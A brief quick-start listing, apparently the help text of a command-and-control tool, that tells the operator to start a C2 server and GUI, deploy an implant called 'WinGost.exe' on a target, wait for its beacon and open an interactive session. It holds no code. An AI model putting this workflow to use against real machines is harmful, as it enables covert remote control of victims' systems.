print [QUICK START]
print 1. ./server.exe                    # Start C2
print 2. python client.py                # Start GUI
print 3. Deploy WinGost.exe              # On target
print 4. Wait for beacon                 # ~30 seconds
print 5. Right-click target -> Interactive

